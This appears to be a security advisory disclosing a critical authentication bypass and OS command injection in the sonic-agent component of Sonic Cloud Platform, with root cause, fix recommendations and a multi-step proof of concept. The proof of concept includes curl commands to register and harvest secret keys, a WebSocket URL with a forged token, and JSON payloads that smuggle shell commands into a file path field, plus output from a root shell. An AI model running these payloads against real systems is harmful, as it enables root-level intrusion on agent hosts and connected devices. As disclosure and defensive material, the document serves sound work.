# V-S003: Sonic Cloud Platform sonic-agent — `pullFile` WebSocket Message OS Command Injection RCE

## Vulnerability Information

| Field | Details |
|-------|---------|
| Product | Sonic Cloud Platform — sonic-agent |
| Version | ≤ v2.7.2 (latest) |
| Type | CWE-287 (Improper Authentication) + CWE-78 (OS Command Injection) |
| Severity | **Critical** |
| CVSS v3.1 Score | **9.9** |
| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Repository | https://github.com/SonicCloudOrg/sonic-agent |
| Affected Files | `AndroidWSServer.java`, `AndroidDeviceBridgeTool.java` |

## Description

The sonic-agent Android WebSocket server (`AndroidWSServer.java`) accepts a `pullFile` message type whose `path` field is **concatenated directly into an ADB shell command** with no sanitization. The resulting command is executed via `sh -c` on the Agent host (Linux), enabling arbitrary OS command execution.

### Two-Layer Vulnerability

**Layer 1 — Authentication Bypass** (prerequisite):

The WebSocket endpoint `ws://{agent}:7777/websockets/android/{secretKey}/{udId}/{token}` has two weak authentication controls:

1. **`secretKey` is publicly readable** — exposed in plaintext via `GET /agents/list`, accessible to any registered user (open registration by default).
2. **`token` field accepts any non-empty string** — the server only checks `token.length() == 0`; no HMAC/JWT signature is validated.

Any registered user (or attacker who self-registers) can establish a fully authenticated WebSocket connection.

**Layer 2 — OS Command Injection**:

Once connected, a `pullFile` message with an injected `path` field triggers command execution on the Agent host as root.

## Root Cause

**File:** `sonic-agent/src/main/java/org/cloud/sonic/agent/bridge/android/AndroidDeviceBridgeTool.java`

```java
public static String pullFile(IDevice iDevice, String path) {
    String command = String.format("%s -s %s pull %s %s",
        getADBPathFromSystemEnv(),
        iDevice.getSerialNumber(),
        path,                           // ← attacker-controlled, no filtering
        file.getAbsolutePath());

    Process process = Runtime.getRuntime().exec(
        new String[]{"sh", "-c", command}   // ← shell interprets injected metacharacters
    );
    // ... reads output and returns download URL
}
```

**Dispatch in `AndroidWSServer.onMessage()`:**

```java
case "pullFile" -> {
    String url = AndroidDeviceBridgeTool.pullFile(iDevice, msg.getString("path"));
    // returns pullResult WebSocket message with upload URL
}
```

**Injection format:**

```
/nonexistent ; <OS_CMD> ;
```

Expands to:
```bash
sh -c "adb -s {serial} pull /nonexistent ; <OS_CMD> ; /tmp/download/"
```

## Proof of Concept

### Step 1 — Obtain secretKey and udId (any registered account)

```bash
# Register (open registration)
curl -s -X POST http://<target>:3000/server/api/controller/users/register \
  -H 'Content-Type: application/json' \
  -d '{"userName":"attacker","password":"123456"}'

# Login
TOKEN=$(curl -s -X POST http://<target>:3000/server/api/controller/users/login \
  -H 'Content-Type: application/json' \
  -d '{"userName":"attacker","password":"123456"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['data'])")

# Enumerate agents — secretKey in plaintext
curl -H "SonicToken: $TOKEN" http://<target>:3000/server/api/controller/agents/list

# Enumerate devices
curl -H "SonicToken: $TOKEN" \
  "http://<target>:3000/server/api/controller/devices/list?page=1&pageSize=20"
```

### Step 2 — Connect to Android WebSocket (auth bypass)

```
wss://<agent_host>:7777/websockets/android/<secretKey>/<udId>/poc_token
```

`poc_token` is an arbitrary non-empty string — the server accepts it.

### Step 3a — Inject command, write output to Agent temp file

```json
{
  "type": "pullFile",
  "path": "/nonexistent ; id > /tmp/poc_out.txt ;"
}
```

Server executes on Agent host:
```bash
sh -c "adb -s {serial} pull /nonexistent ; id > /tmp/poc_out.txt ; /tmp/download/"
```

### Step 3b — Push output file to device, then pull it back via normal pullFile

```json
{
  "type": "pullFile",
  "path": "/nonexistent ; adb -s {udId} push /tmp/poc_out.txt /sdcard/poc_out.txt ;"
}
```

```json
{
  "type": "pullFile",
  "path": "/sdcard/poc_out.txt"
}
```

Server returns WebSocket response:
```json
{
  "msg": "pullResult",
  "status": "success",
  "url": "/server/api/controller/file/download?fileName=poc_out.txt&..."
}
```

### Step 4 — Download command output via HTTP

```bash
curl -H "SonicToken: $TOKEN" \
  "http://<target>:3000/server/api/controller/file/download?fileName=poc_out.txt&..."

# Output:
# uid=0(root) gid=0(root) groups=0(root)
```

### Complete Interactive Shell (PoC script)

See [`poc_pullfile_rce.py`](./poc_pullfile_rce.py) for a full interactive shell implementation that automates the two-step inject→pull→download flow.

```
$ python poc_pullfile_rce.py -u https://<target>:443 -x socks5://127.0.0.1:1080

[+] 已选 Agent#1  agent-003.sonic.example.com:443
[+] 已选设备  udId=GQUS5TAQHQT4IBAI  model=2207117BPG  status=DEBUGGING
[*] Agent 就绪，输入命令（exit 退出）

sonic-agent$ id
uid=0(root) gid=0(root) groups=0(root)

sonic-agent$ cat /etc/hostname
sonic-agent-prod-03

sonic-agent$ whoami
root
```

## Impact

| Category | Detail |
|----------|--------|
| **Code Execution** | Arbitrary OS commands as root on Agent host |
| **Data Exfiltration** | Read any file from Agent host via pull→upload chain |
| **Device Control** | Full ADB access to all connected Android devices |
| **Persistence** | Write SSH keys, plant backdoors, modify crontab |
| **Lateral Movement** | Agent host has network access to internal infrastructure |

## Fix Recommendation

| Priority | Action |
|----------|--------|
| **Critical** | Validate `path` against strict allowlist: only `/sdcard/` prefix, reject `;`, `&`, `\|`, `` ` ``, `$`, `(`, `)` |
| **Critical** | Replace `Runtime.exec(new String[]{"sh","-c", command})` with parameterized exec: `new String[]{"adb","-s",serial,"pull",path,dest}` — eliminates shell interpretation entirely |
| **High** | Validate `secretKey` server-side on WebSocket handshake using HMAC; remove it from `/agents/list` API response for non-admin users |
| **High** | Implement proper JWT/HMAC token validation on WebSocket endpoint — reject non-empty but unsigned tokens |
| **Medium** | Run sonic-agent as a non-root user |
